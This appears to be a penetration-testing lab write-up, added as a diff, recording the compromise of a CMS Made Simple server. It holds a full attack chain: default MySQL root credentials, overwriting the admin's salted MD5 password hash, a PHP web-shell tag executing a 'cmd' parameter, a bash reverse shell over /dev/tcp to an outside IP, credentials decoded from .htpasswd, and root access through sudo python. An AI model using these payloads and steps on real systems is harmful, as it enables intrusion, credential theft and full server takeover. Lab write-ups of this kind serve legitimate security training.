@@ -1,0 +1,280 @@
+
+
+
+
+The default credentials for a fresh MySQL installation typically include a root user. The password for this root user can vary depending on the installation method and operating system:
+
+    No password:
+    In many cases, especially with manual installations or older versions, the root user might initially have no password set. This means you can log in as root without providing any password.
+
+
+root:root gets us in
+
+┌──(root㉿kali)-[/home/kali]
+└─# mysql -h 192.168.206.74 -P 3306 -u root -p --skip-ssl-verify-server-cert
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 53
+Server version: 8.0.19 MySQL Community Server - GPL
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Support MariaDB developers by giving a star at https://github.com/MariaDB/server
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL [(none)]> show databases;
+^[[3~+--------------------+
+| Database           |
++--------------------+
+| cmsms_db           |
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+5 rows in set (0.033 sec)
+
+MySQL [(none)]> use cmsms_db
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MySQL [cmsms_db]> show tables;
++--------------------------------+
+| Tables_in_cmsms_db             |
++--------------------------------+
+| cms_additional_users           |
+| cms_additional_users_seq       |
+| cms_admin_bookmarks            |
+| cms_admin_bookmarks_seq        |
+| cms_adminlog                   |
+| cms_content                    |
+| cms_content_props              |
+| cms_content_props_seq          |
+| cms_content_seq                |
+| cms_event_handler_seq          |
+| cms_event_handlers             |
+| cms_events                     |
+| cms_events_seq                 |
+| cms_group_perms                |
+| cms_group_perms_seq            |
+| cms_groups                     |
+| cms_groups_seq                 |
+| cms_layout_design_cssassoc     |
+| cms_layout_design_tplassoc     |
+| cms_layout_designs             |
+| cms_layout_stylesheets         |
+| cms_layout_templates           |
+| cms_layout_tpl_addusers        |
+| cms_layout_tpl_categories      |
+| cms_layout_tpl_type            |
+| cms_locks                      |
+| cms_mod_cmsjobmgr              |
+| cms_mod_filepicker_profiles    |
+| cms_module_deps                |
+| cms_module_news                |
+| cms_module_news_categories     |
+| cms_module_news_categories_seq |
+| cms_module_news_fielddefs      |
+| cms_module_news_fieldvals      |
+| cms_module_news_seq            |
+| cms_module_search_index        |
+| cms_module_search_items        |
+| cms_module_search_items_seq    |
+| cms_module_search_words        |
+| cms_module_smarty_plugins      |
+| cms_module_templates           |
+| cms_modules                    |
+| cms_permissions                |
+| cms_permissions_seq            |
+| cms_routes                     |
+| cms_siteprefs                  |
+| cms_user_groups                |
+| cms_userplugins                |
+| cms_userplugins_seq            |
+| cms_userprefs                  |
+| cms_users                      |
+| cms_users_seq                  |
+| cms_version                    |
++--------------------------------+
+53 rows in set (0.033 sec)
+
+MySQL [cmsms_db]> select * from cms_users;
++---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+
+| user_id | username | password                         | admin_access | first_name | last_name | email             | active | create_date         | modified_date       |
++---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+
+|       1 | admin    | 59f9ba27528694d9b3493dfde7709e70 |            1 |            |           | admin@mycms.local |      1 | 2020-03-25 09:38:46 | 2020-03-26 10:49:17 |
++---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+
+1 row in set (0.029 sec)
+
+MySQL [cmsms_db]> 
+
+MySQL [cmsms_db]> -- set admin's password to 'P@ssw0rd' (use whatever password you prefer)
+MySQL [cmsms_db]> UPDATE cms_users
+    -> SET password = MD5('P@ssw0rd'),
+    ->     modified_date = NOW()
+    -> WHERE username = 'admin';
+Query OK, 1 row affected (0.033 sec)
+Rows matched: 1  Changed: 1  Warnings: 0
+
+MySQL [cmsms_db]> 
+MySQL [cmsms_db]> -- verify the change
+MySQL [cmsms_db]> SELECT user_id, username, password, modified_date FROM cms_users WHERE username='admin'\G
+*************************** 1. row ***************************
+      user_id: 1
+     username: admin
+     password: 161ebd7d45089b3446ee4e0d86dbcf92
+modified_date: 2025-10-08 23:28:02
+1 row in set (0.031 sec)
+
+MySQL [cmsms_db]> 
+
+This doesnt work due to salting?
+
+helpful:
+https://cmscanbesimple.org/blog/cms-made-simple-admin-password-recovery
+
+The “right way” for salted hashes (use site sitemask) Your cms_siteprefs table already contains a sitemask row (I saw sitemask = a235561351813137). Many CMSMS installs use such a site mask or similar value when hashing passwords (appending or prepending a site salt). Let’s use that to construct the correct MD5 hash for a known password.
+
+MySQL [cmsms_db]> SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'\G
+*************************** 1. row ***************************
+sitepref_value: a235561351813137
+1 row in set (0.035 sec)
+
+MySQL [cmsms_db]> UPDATE cms_users
+    -> SET password = MD5(CONCAT((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name='sitemask'), 'P@ssw0rd')),
+    ->     modified_date = NOW()
+    -> WHERE username='admin';
+Query OK, 1 row affected (0.037 sec)
+Rows matched: 1  Changed: 1  Warnings: 0
+
+MySQL [cmsms_db]> 
+
+this works.
+
+1) Create the UDT (admin UI)
+Admin → Extensions → User Defined Tags → Add New User Defined Tag
+
+Fields:
+
+Tag name: pwn
+Tag type: PHP
+Tag code: paste exactly this (copy/paste from here)
+<?php
+// pwn UDT - execute ?cmd= and print output
+if (isset($_GET['cmd'])) {
+    echo "<pre>";
+    if (function_exists('system')) {
+        system($_GET['cmd']);
+    } elseif (function_exists('passthru')) {
+        passthru($_GET['cmd']);
+    } elseif (function_exists('shell_exec')) {
+        echo shell_exec($_GET['cmd']);
+    } elseif (function_exists('exec')) {
+        $out = array(); exec($_GET['cmd'], $out); echo implode("\n",$out);
+    } else {
+        echo "No exec functions available";
+    }
+    echo "</pre>";
+}
+?>
+2) Add a page that calls the tag (admin UI)
+Admin → Content → Add New Content
+
+Title: shell
+Content (body): {pwn}
+Publish the page (Active = yes)
+Note: if you prefer, you can edit the Home template or a global footer (we earlier tried DB edits) — now you can do this cleanly through the UI.
+
+http://192.168.206.74/index.php?page=shell&cmd=id
+
+that wouldnt work. Instead, we created a direct php revshell in the webpage.
+
+system("bash -c 'bash -i >& /dev/tcp/192.168.49.183/443 0>&1'");
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 443          
+listening on [any] 443 ...
+connect to [192.168.45.210] from (UNKNOWN) [192.168.195.74] 54796
+bash: cannot set terminal process group (532): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@mycmsms:/var/www/html$ id
+
+
+www-data@mycmsms:/var/www/html$ ls -lsa
+total 6864
+   4 drwxr-xr-x 10 root     root        4096 May 31  2020 .
+   4 drwxr-xr-x  3 root     root        4096 Aug 14  2020 ..
+   4 drwxr-xr-x  6 www-data www-data    4096 Jun 24  2020 admin
+   4 drwxr-xr-x  9 www-data www-data    4096 Mar 26  2020 assets
+6796 -rw-r--r--  1 www-data www-data 6955062 Mar 26  2020 cmsms-2.2.13-install.php
+   4 -rw-r--r--  1 www-data www-data     248 Mar 26  2020 config.php
+   4 drwxr-xr-x  2 www-data www-data    4096 Mar 26  2020 doc
+   4 -rw-r--r--  1 www-data www-data    1150 Mar 26  2020 favicon_cms.ico
+  12 -rw-r--r--  1 www-data www-data   12050 Mar 26  2020 index.php
+   4 drwxr-xr-x 11 www-data www-data    4096 Mar 26  2020 lib
+   4 -rw-r--r--  1 www-data www-data     959 Mar 26  2020 moduleinterface.php
+   4 drwxr-xr-x 15 www-data www-data    4096 Mar 26  2020 modules
+   4 -rw-r--r--  1 www-data www-data      21 Mar 25  2020 phpinfo.php
+   4 drwxr-xr-x 12 root     root        4096 Mar 21  2020 phpmyadmin
+   4 drwxr-xr-x  4 www-data www-data    4096 Mar 26  2020 tmp
+   4 drwxr-xr-x  6 www-data www-data    4096 Mar 26  2020 uploads
+www-data@mycmsms:/var/www/html$ cd admin
+www-data@mycmsms:/var/www/html/admin$ ls -lsa
+total 340
+ 4 drwxr-xr-x  6 www-data www-data  4096 Jun 24  2020 .
+ 4 drwxr-xr-x 10 root     root      4096 May 31  2020 ..
+ 4 -rw-r--r--  1 www-data www-data   472 Mar 26  2020 .htaccess
+ 4 -rw-r--r--  1 www-data www-data    45 Jun 24  2020 .htpasswd
+
+www-data@mycmsms:/var/www/html/admin$ cat .htpasswd
+TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=
+
+┌──(root㉿kali)-[/home/kali]
+└─# base64 -d asd
+MFZG233VOI5FG2DJMVWGIQBRGIZQ====                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# rm asd       
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# nano asd
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# nano asd
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# base32 -d asd
+armour:Shield@123                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+armour@mycmsms:/var/www/html/admin$ sudo -l
+Matching Defaults entries for armour on mycmsms:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User armour may run the following commands on mycmsms:
+    (root) NOPASSWD: /usr/bin/python
+armour@mycmsms:/var/www/html/admin$ sudo python -c 'import os; os.system("/bin/sh")'
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root/
+# ls -lsa
+total 20
+4 drwx------  4 root root 4096 Oct  9 05:39 .
+4 drwxr-xr-x 18 root root 4096 Jun 29  2020 ..
+0 -rw-------  1 root root    0 Sep  1  2020 .bash_history
+0 -rw-r--r--  1 root root    0 Aug 20  2020 .bashrc
+4 drwx------  3 root root 4096 Mar 25  2020 .gnupg
+0 -rw-r--r--  1 root root    0 Aug 20  2020 .profile
+4 -rw-r--r--  1 root root   33 Oct  9 05:39 proof.txt
+0 -rw-r--r--  1 root root    0 Aug 20  2020 .selected_editor
+4 drwxr-xr-x  2 root root 4096 Mar 25  2020 .ssh
+# cat proof.txt
+3469e100ab5696f0a26833efd1fdb873
+# 
+
+
+
+
+
+
+
